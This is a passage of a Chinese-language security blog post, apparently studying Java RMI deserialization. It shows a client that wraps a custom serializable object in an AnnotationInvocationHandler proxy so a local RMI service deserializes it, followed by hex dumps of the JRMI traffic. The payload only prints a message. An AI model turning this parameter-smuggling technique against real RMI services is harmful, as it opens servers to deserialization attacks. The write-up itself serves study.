class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(<span class="string">"127.0.0.1"</span>, <span class="number">9999</span>);</span><br><span class="line">        DeserializeObject deserializeObject = <span class="keyword">new</span> DeserializeObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Constructor constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(<span class="keyword">new</span> Class[]&#123;Class.class, Map.class&#125;);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(<span class="string">"aaa"</span>, deserializeObject);</span><br><span class="line">        InvocationHandler obj = (InvocationHandler) constructor.newInstance(Deprecated.class, hashMap);</span><br><span class="line"></span><br><span class="line">        TestObject services = (TestObject) registry.lookup(<span class="string">"test"</span>);</span><br><span class="line">        CharSequence proxy = (CharSequence) Proxy.newProxyInstance(String.class.getClassLoader(), String.class.getInterfaces(), obj);</span><br><span class="line">        services.callMe(proxy);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">TestObject</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">callMe</span><span class="params">(Dummy input)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestObjectImpl</span> <span class="keyword">implements</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">callMe</span><span class="params">(Dummy input)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"callMe: "</span> + input);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DummyImpl</span> <span class="keyword">implements</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> demo.rmb122;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeserializeObject</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ois.defaultReadObject();</span><br><span class="line">        System.out.println(<span class="string">"DeserializeObject.readObject"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如下:  </p><p>RMIServiceProvider 输出:<br><img src="https://i.loli.net/2020/02/19/ur2VUMmH5l9IDvz.png" alt="2.png"></p><p>大致理解起来还是不太困难的, 客户端通过 <code>Registry</code>, 调用 <code>RMIServiceProvider</code> 上的服务.<br>可以看看 wireshark 的流量, 更清晰一些.  </p><p>Client &lt;-&gt; Registry 之间的流量, 缩进的是注册局发给客户端的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">00000000  4a 52 4d 49 00 02 4b                               JRMI..K</span><br><span class="line">    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 84 58   N..127.0 .0.1...X</span><br><span class="line">00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....</span><br><span class="line">00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 00 00   P....w&quot;. ........</span><br><span class="line">00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000036  02 44 15 4d c9 d4 e6 3b  df 74 00 04 74 65 73 74   .D.M...; .t..test</span><br><span class="line">    00000010  51 ac ed 00 05 77 0f 01  e8 1f e8 41 00 00 01 70   Q....w.. ...A...p</span><br><span class="line">    00000020  5d a3 bd 51 80 0c 73 7d  00 00 00 01 00 16 64 65   ]..Q..s&#125; ......de</span><br><span class="line">    00000030  6d 6f 2e 72 6d 62 31 32  32 2e 54 65 73 74 4f 62   mo.rmb12 2.TestOb</span><br><span class="line">    00000040  6a 65 63 74 70 78 72 00  17 6a 61 76 61 2e 6c 61   jectpxr. .java.la</span><br><span class="line">    00000050  6e 67 2e 72 65 66 6c 65  63 74 2e 50 72 6f 78 79   ng.refle ct.Proxy</span><br><span class="line">    00000060  e1 27 da 20 cc 10 43 cb  02 00 01 4c 00 01 68 74   .&#39;. ..C. ...L..ht</span><br><span class="line">    00000070  00 25 4c 6a 61 76 61 2f  6c 61 6e 67 2f 72 65 66   .%Ljava&#x2F; lang&#x2F;ref</span><br><span class="line">    00000080  6c 65 63 74 2f 49 6e 76  6f 63 61 74 69 6f 6e 48   lect&#x2F;Inv ocationH</span><br><span class="line">    00000090  61 6e 64 6c 65 72 3b 70  78 70 73 72 00 2d 6a 61   andler;p xpsr.-ja</span><br><span class="line">    000000A0  76 61 2e 72 6d 69 2e 73  65 72 76 65 72 2e 52 65   va.rmi.s erver.Re</span><br><span class="line">    000000B0  6d 6f 74 65 4f 62 6a 65  63 74 49 6e 76 6f 63 61   moteObje ctInvoca</span><br><span class="line">    000000C0  74 69 6f 6e 48 61 6e 64  6c 65 72 00 00 00 00 00   tionHand ler.....</span><br><span class="line">    000000D0  00 00 02 02 00 00 70 78  72 00 1c 6a 61 76 61 2e   ......px r..java.</span><br><span class="line">    000000E0  72 6d 69 2e 73 65 72 76  65 72 2e 52 65 6d 6f 74   rmi.serv er.Remot</span><br><span class="line">    000000F0  65 4f 62 6a 65 63 74 d3  61 b4 91 0c 61 33 1e 03   eObject. a...a3..</span><br><span class="line">    00000100  00 00 70 78 70 77 32 00  0a 55 6e 69 63 61 73 74   ..pxpw2. .Unicast</span><br><span class="line">    00000110  52 65 66 00 09 31 32 37  2e 30 2e 31 2e 31 00 00   Ref..127 .0.1.1..</span><br><span class="line">    00000120  a9 83 27 2e 2f a2 08 49  09 8f ab a0 76 97 00 00   ..&#39;.&#x2F;..I ....v...</span><br><span class="line">    00000130  01 70 5d a6 5c 22 80 01  01 78                     .p].\&quot;.. .x</span><br><span class="line">00000046  52                                                 R</span><br><span class="line">    0000013A  53                                                 S</span><br><span class="line">00000047  54 e8 1f e8 41 00 00 01  70 5d a3 bd 51 80 0c      T...A... p]..Q..</span><br></pre></td></tr></table></figure><p>Client &lt;-&gt; RMIServiceProvider 之间的流量, 缩进的是服务提供者发给客户端的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br></pre></td><td class="code"><pre><span class="line">00000000  4a 52 4d 49 00 02 4b                               JRMI..K</span><br><span class="line">    00000000  4e 00 09 31 32 37 2e 30  2e 30 2e 31 00 00 c1 c2   N..127.0 .0.1....</span><br><span class="line">00000007  00 09 31 32 37 2e 30 2e  31 2e 31 00 00 00 00      ..127.0. 1.1....</span><br><span class="line">00000016  50 ac ed 00 05 77 22 00  00 00 00 00 00 00 02 00   P....w&quot;. ........</span><br><span class="line">00000026  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ........ ........</span><br><span class="line">00000036  01 f6 b6 89 8d 8b f2 86  43 75 72 00 18 5b 4c 6a   ........ Cur..[Lj</span><br><span class="line">00000046  61 76 61 2e 72 6d 69 2e  73 65 72 76 65 72 2e 4f   ava.rmi. server.O</span><br><span class="line">00000056  62 6a 49 44 3b 87 13 00  b8 d0 2c 64 7e 02 00 00   bjID;... ..,d~...</span><br><span class="line">00000066  70 78 70 00 00 00 01 73  72 00 15 6a 61 76 61 2e   pxp....s r..java.</span><br><span class="line">00000076  72 6d 69 2e 73 65 72 76  65 72 2e 4f 62 6a 49 44   rmi.serv er.ObjID</span><br><span class="line">00000086  a7 5e fa 12 8d dc e5 5c  02 00 02 4a 00 06 6f 62   .^.....\ ...J..ob</span><br><span class="line">00000096  6a 4e 75 6d 4c 00 05 73  70 61 63 65 74 00 15 4c   jNumL..s pacet..L</span><br><span class="line">000000A6  6a 61 76 61 2f 72 6d 69  2f 73 65 72 76 65 72 2f   java&#x2F;rmi &#x2F;server&#x2F;</span><br><span class="line">000000B6  55 49 44 3b 70 78 70 27  2e 2f a2 08 49 09 8f 73   UID;pxp&#39; .&#x2F;..I..s</span><br><span class="line">000000C6  72 00 13 6a 61 76 61 2e  72 6d 69 2e 73 65 72 76   r..java. rmi.serv</span><br><span class="line">000000D6  65 72 2e 55 49 44 0f 12  70 0d bf 36 4f 12 02 00   er.UID.. p..6O...</span><br><span class="line">000000E6  03 53 00 05 63 6f 75 6e  74 4a 00 04 74 69 6d 65   .S..coun tJ..time</span><br><span class="line">000000F6  49 00 06 75 6e 69 71 75  65 70 78 70 80 01 00 00   I..uniqu epxp....</span><br><span class="line">00000106  01 70 5d a6 5c 22 ab a0  76 97 77 08 80 00 00 00   .p].\&quot;.. v.w.....</span><br><span class="line">00000116  00 00 00 00 73 72 00 12  6a 61 76 61 2e 72 6d 69   ....sr.. java.rmi</span><br><span class="line">00000126  2e 64 67 63 2e 4c 65 61  73 65 b0 b5 e2 66 0c 4a   .dgc.Lea se...f.J</span><br><span class="line">00000136  dc 34 02 00 02 4a 00 05  76 61 6c 75 65 4c 00 04   .4...J.. valueL..</span><br><span class="line">00000146  76 6d 69 64 74 00 13 4c  6a 61 76 61 2f 72 6d 69   vmidt..L java&#x2F;rmi</span><br><span class="line">00000156  2f 64 67 63 2f 56 4d 49  44 3b 70 78 70 00 00 00   &#x2F;dgc&#x2F;VMI D;pxp...</span><br><span class="line">00000166  00 00 09 27 c0 73 72 00  11 6a 61 76 61 2e 72 6d   ...&#39;.sr. .java.rm</span><br><span class="line">00000176  69 2e 64 67 63 2e 56 4d  49 44 f8 86 5b af a4 a5   i.dgc.VM ID..[...</span><br><span class="line">00000186  6d b6 02 00 02 5b 00 04  61 64 64 72 74 00 02 5b   m....[.. addrt..[</span><br><span class="line">00000196  42 4c 00 03 75 69 64 71  00 7e 00 03 70 78 70 75   BL..uidq .~..pxpu</span><br><span class="line">000001A6  72 00 02 5b 42 ac f3 17  f8 06 08 54 e0 02 00 00   r..[B... ...T....</span><br><span class="line">000001B6  70 78 70 00 00 00 08 f7  88 3b 04 59 fc a2 27 73   pxp..... .;.Y..&#39;s</span><br><span class="line">000001C6  71 00 7e 00 05 80 01 00  00 01 70 5d aa ea e5 dd   q.~..... ..p]....</span><br><span class="line">000001D6  bd ea 1a                                           ...</span><br><span class="line">    00000010  51 ac ed 00 05 77 0f 01  ab a0 76 97 00 00 01 70   Q....w.. ..v....p</span><br><span class="line">    00000020  5d a6 5c 22 80 05 73 72  00 12 6a 61 76 61 2e 72   ].\&quot;..sr ..java.r</span><br><span class="line">    00000030  6d 69 2e 64 67 63 2e 4c  65 61 73 65 b0 b5 e2 66   mi.dgc.L ease...f</span><br><span class="line">    00000040  0c 4a dc 34 02 00 02 4a  00 05 76 61 6c 75 65 4c   .J.4...J ..valueL</span><br><span class="line">    00000050  00 04 76 6d 69 64 74 00  13 4c 6a 61 76 61 2f 72   ..vmidt. .Ljava&#x2F;r</span><br><span class="line">    00000060  6d 69 2f 64 67 63 2f 56  4d 49 44 3b 70 78 70 00   mi&#x2F;dgc&#x2F;V MID;pxp.</span><br><span class="line">    00000070  00 00 00 00 09 27 c0 73  72 00 11 6a 61 76 61 2e   .....&#39;.s r..java.</span><br><span class="line">    00000080  72 6d 69 2e 64 67 63 2e  56 4d 49 44 f8 86 5b af   rmi.dgc. VMID..[.</span><br><span class="line">    00000090  a4 a5 6d b6 02 00 02 5b  00 04 61 64 64 72 74 00   ..m....[ ..addrt.</span><br><span class="line">    000000A0  02 5b 42 4c 00 03 75 69  64 74 00 15 4c 6a 61 76   .[BL..ui dt..Ljav</span><br><span class="line">    000000B0  61 2f 72 6d 69 2f 73 65  72 76 65 72 2f 55 49 44   a&#x2F;rmi&#x2F;se rver&#x2F;UID</span><br><span class="line">    000000C0  3b 70 78 70 75 72 00 02  5b 42 ac f3 17 f8 06 08   ;pxpur.. [B......</span><br><span class="line">    000000D0  54 e0 02 00 00 70 78 70  00 00 00 08 f7 88 3b 04   T....pxp ......;.</span><br><span class="line">    000000E0  59 fc a2 27 73 72 00 13  6a 61 76 61 2e 72 6d 69   Y..&#39;sr.. java.rmi</span><br><span class="line">    000000F0  2e 73 65 72 76 65 72 2e  55 49 44 0f 12 70 0d bf   .server. UID..p..</span><br><span class="line">    00000100  36 4f 12 02 00 03 53 00  05 63 6f 75 6e 74 4a 00   6O....S. .countJ.</span><br><span class="line">    00000110  04 74 69 6d 65 49 00 06  75 6e 69 71 75 65 70 78   .timeI.. uniquepx</span><br><span class="line">    00000120  70 80 01 00 00 01 70 5d  aa ea e5 dd bd ea 1a      p.....p] .......</span><br><span class="line">000001D9  52                                                 R</span><br><span class="line">    0000012F  53                                                 S</span><br><span class="line">000001DA  50 ac ed 00 05 77 22 27  2e 2f a2 08 49 09 8f ab   P....w&quot;&#39; .&#x2F;..I...</span><br><span class="line">000001EA  a0 76 97 00 00 01 70 5d  a6 5c 22 80 01 ff ff ff   .v....p] .\&quot;.....</span><br><span class="line">000001FA  ff d9 0d 2f 12 e0 71 7f  42 73 7d 00 00 00 01 00   ...&#x2F;..q. Bs&#125;.....</span><br><span class="line">0000020A  11 64 65 6d 6f 2e 72 6d  62 31 32 32 2e 44 75 6d   .demo.rm b122.Dum</span><br><span class="line">0000021A  6d 79 70 78 72 00 17 6a  61 76 61 2e 6c 61 6e 67   mypxr..j ava.lang</span><br><span class="line">0000022A  2e 72 65 66 6c 65 63 74  2e 50 72 6f 78 79 e1 27   .reflect .Proxy.&#39;</span><br><span class="line">0000023A  da 20 cc 10 43 cb 02 00  01 4c 00 01 68 74 00 25   . ..C... .L..ht.%</span><br><span class="line">0000024A  4c 6a 61 76 61 2f 6c 61  6e 67 2f 72 65 66 6c 65   Ljava&#x2F;la ng&#x2F;refle</span><br><span class="line">0000025A  63 74 2f 49 6e 76 6f 63  61 74 69 6f 6e 48 61 6e   ct&#x2F;Invoc ationHan</span><br><span class="line">0000026A  64 6c 65 72 3b 70 78 70  73 72 00 32 73 75 6e 2e   dler;pxp sr.2sun.</span><br><span class="line">0000027A  72 65 66 6c 65 63 74 2e  61 6e 6e 6f 74 61 74 69   reflect. annotati</span><br><span class="line">0000028A  6f 6e 2e 41 6e 6e 6f 74  61 74 69 6f 6e 49 6e 76   on.Annot ationInv</span><br><span class="line">0000029A  6f 63 61 74 69 6f 6e 48  61 6e 64 6c 65 72 55 ca   ocationH andlerU.</span><br><span class="line">000002AA  f5 0f 15 cb 7e a5 02 00  02 4c 00 0c 6d 65 6d 62   ....~... .L..memb</span><br><span class="line">000002BA  65 72 56 61 6c 75 65 73  74 00 0f 4c 6a 61 76 61   erValues t..Ljava</span><br><span class="line">000002CA  2f 75 74 69 6c 2f 4d 61  70 3b 4c 00 04 74 79 70   &#x2F;util&#x2F;Ma p;L..typ</span><br><span class="line">000002DA  65 74 00 11 4c 6a 61 76  61 2f 6c 61 6e 67 2f 43   et..Ljav a&#x2F;lang&#x2F;C</span><br><span class="line">000002EA  6c 61 73 73 3b 70 78 70  73 72 00 11 6a 61 76 61   lass;pxp sr..java</span><br><span class="line">000002FA  2e 75 74 69 6c 2e 48 61  73 68 4d 61 70 05 07 da   .util.Ha shMap...</span><br><span class="line">0000030A  c1 c3 16 60 d1 03 00 02  46 00 0a 6c 6f 61 64 46   ...&#96;.... F..loadF</span><br><span class="line">0000031A  61 63 74 6f 72 49 00 09  74 68 72 65 73 68 6f 6c   actorI.. threshol</span><br><span class="line">0000032A  64 70 78 70 3f 40 00 00  00 00 00 0c 77 08 00 00   dpxp?@.. ....w...</span><br><span class="line">0000033A  00 10 00 00 00 01 74 00  03 61 61 61 73 72 00 1d   ......t. .aaasr..</span><br><span class="line">0000034A  64 65 6d 6f 2e 72 6d 62  31 32 32 2e 44 65 73 65   demo.rmb 122.Dese</span><br><span class="line">0000035A  72 69 61 6c 69 7a 65 4f  62 6a 65 63 74 e7 b9 28   rializeO bject..(</span><br><span class="line">0000036A  12 38 24 61 0c 02 00 00  70 78 70 78 76 72 00 14   .8$a.... pxpxvr..</span><br><span class="line">0000037A  6a 61 76 61 2e 6c 61 6e  67 2e 44 65 70 72 65 63   java.lan g.Deprec</span><br><span class="line">0000038A  61 74 65 64 00 00 00 00  00 00 00 00 00 00 00 70   ated.... .......p</span><br><span class="line">0000039A  78 70                                              xp</span><br><span class="line">    00000130  51 ac ed 00 05 77 0f 02  ab a0 76 97 00 00 01 70   Q....w.. ..v....p</span><br><span class="line">    00000140  5d a6 5c 22 80 06 73 72  00 1e 6a 61 76 61 2e 6c   ].\&quot;..sr ..java.l</span><br><span class="line">    00000150  61 6e 67 2e 4e 75 6c 6c  50 6f 69 6e 74 65 72 45   ang.Null PointerE</span><br><span class="line">    00000160  78 63 65 70 74 69 6f 6e  47 a5 a1 8e ff 31 e1 b8   xception G....1..</span><br><span class="line">    00000170  02 00 00 70 78 72 00 1a  6a 61 76 61 2e 6c 61 6e   ...pxr.. java.lan</span><br><span class="line">    00000180  67 2e 52 75 6e 74 69 6d  65 45 78 63 65 70 74 69   g.Runtim eExcepti</span><br><span class="line">    00000190  6f 6e 9e 5f 06 47 0a 34  83 e5 02 00 00 70 78 72   on._.G.4 .....pxr</span><br><span class="line">    000001A0  00 13 6a 61 76 61 2e 6c  61 6e 67 2e 45 78 63 65   ..java.l ang.Exce</span><br><span class="line">    000001B0  70 74 69 6f 6e d0 fd 1f  3e 1a 3b 1c c4 02 00 00   ption... &gt;.;.....</span><br><span class="line">    000001C0  70 78 72 00 13 6a 61 76  61 2e 6c 61 6e 67 2e 54   pxr..jav a.lang.T</span><br><span class="line">    000001D0  68 72 6f 77 61 62 6c 65  d5 c6 35 27 39 77 b8 cb   hrowable ..5&#39;9w..</span><br><span class="line">    000001E0  03 00 04 4c 00 05 63 61  75 73 65 74 00 15 4c 6a   ...L..ca uset..Lj</span><br><span class="line">    000001F0  61 76 61 2f 6c 61 6e 67  2f 54 68 72 6f 77 61 62   ava&#x2F;lang &#x2F;Throwab</span><br><span class="line">    00000200  6c 65 3b 4c 00 0d 64 65  74 61 69 6c 4d 65 73 73   le;L..de tailMess</span><br><span class="line">    00000210  61 67 65 74 00 12 4c 6a  61 76 61 2f 6c 61 6e 67   aget..Lj ava&#x2F;lang</span><br><span class="line">    00000220  2f 53 74 72 69 6e 67 3b  5b 00 0a 73 74 61 63 6b   &#x2F;String; [..stack</span><br><span class="line">    00000230  54 72 61 63 65 74 00 1e  5b 4c 6a 61 76 61 2f 6c   Tracet.. [Ljava&#x2F;l</span><br><span class="line">    00000240  61 6e 67 2f 53 74 61 63  6b 54 72 61 63 65 45 6c   ang&#x2F;Stac kTraceEl</span><br><span class="line">    00000250  65 6d 65 6e 74 3b 4c 00  14 73 75 70 70 72 65 73   ement;L. .suppres</span><br><span class="line">    00000260  73 65 64 45 78 63 65 70  74 69 6f 6e 73 74 00 10   sedExcep tionst..</span><br><span class="line">    00000270  4c 6a 61 76 61 2f 75 74  69 6c 2f 4c 69 73 74 3b   Ljava&#x2F;ut il&#x2F;List;</span><br><span class="line">    00000280  70 78 70 71 00 7e 00 08  70 75 72 00 1e 5b 4c 6a   pxpq.~.. pur..[Lj</span><br><span class="line">    00000290  61 76 61 2e 6c 61 6e 67  2e 53 74 61 63 6b 54 72   ava.lang .StackTr</span><br><span class="line">    000002A0  61 63 65 45 6c 65 6d 65  6e 74 3b 02 46 2a 3c 3c   aceEleme nt;.F*&lt;&lt;</span><br><span class="line">    000002B0  fd 22 39 02 00 00 70 78  70 00 00 00 17 73 72 00   .&quot;9...px p....sr.</span><br><span class="line">    000002C0  1b 6a 61 76 61 2e 6c 61  6e 67 2e 53 74 61 63 6b   .java.la ng.Stack</span><br><span class="line">    000002D0  54 72 61 63 65 45 6c 65  6d 65 6e 74 61 09 c5 9a   TraceEle menta...</span><br><span class="line">    000002E0  26 36 dd 85 02 00 08 42  00 06 66 6f 72 6d 61 74   &amp;6.....B ..format</span><br><span class="line">    000002F0  49 00 0a 6c 69 6e 65 4e  75 6d 62 65 72 4c 00 0f   I..lineN umberL..</span><br><span class="line">    00000300  63 6c 61 73 73 4c 6f 61  64 65 72 4e 61 6d 65 71   classLoa derNameq</span><br><span class="line">    00000310  00 7e 00 05 4c 00 0e 64  65 63 6c 61 72 69 6e 67   .~..L..d eclaring</span><br><span class="line">    00000320  43 6c 61 73 73 71 00 7e  00 05 4c 00 08 66 69 6c   Classq.~ ..L..fil</span><br><span class="line">    00000330  65 4e 61 6d 65 71 00 7e  00 05 4c 00 0a 6d 65 74   eNameq.~ ..L..met</span><br><span class="line">    00000340  68 6f 64 4e 61 6d 65 71  00 7e 00 05 4c 00 0a 6d   hodNameq .~..L..m</span><br><span class="line">    00000350  6f 64 75 6c 65 4e 61 6d  65 71 00 7e 00 05 4c 00   oduleNam eq.~..L.</span><br><span class="line">    00000360  0d 6d 6f 64 75 6c 65 56  65 72 73 69 6f 6e 71 00   .moduleV ersionq.</span><br><span class="line">    00000370  7e 00 05 70 78 70 02 00  00 00 a6 70 74 00 32 73   ~..pxp.. ...pt.2s</span><br><span class="line">    00000380  75 6e 2e 72 65 66 6c 65  63 74 2e 61 6e 6e 6f 74   un.refle ct.annot</span><br><span class="line">    00000390  61 74 69 6f 6e 2e 41 6e  6e 6f 74 61 74 69 6f 6e   ation.An notation</span><br><span class="line">    000003A0  49 6e 76 6f 63 61 74 69  6f 6e 48 61 6e 64 6c 65   Invocati onHandle</span><br><span class="line">    000003B0  72 74 00 20 41 6e 6e 6f  74 61 74 69 6f 6e 49 6e   rt. Anno tationIn</span><br><span class="line">    000003C0  76 6f 63 61 74 69 6f 6e  48 61 6e 64 6c 65 72 2e   vocation Handler.</span><br><span class="line">    000003D0  6a 61 76 61 74 00 13 6d  65 6d 62 65 72 56 61 6c   javat..m emberVal</span><br><span class="line">    000003E0  75 65 54 6f 53 74 72 69  6e 67 74 00 09 6a 61 76   ueToStri 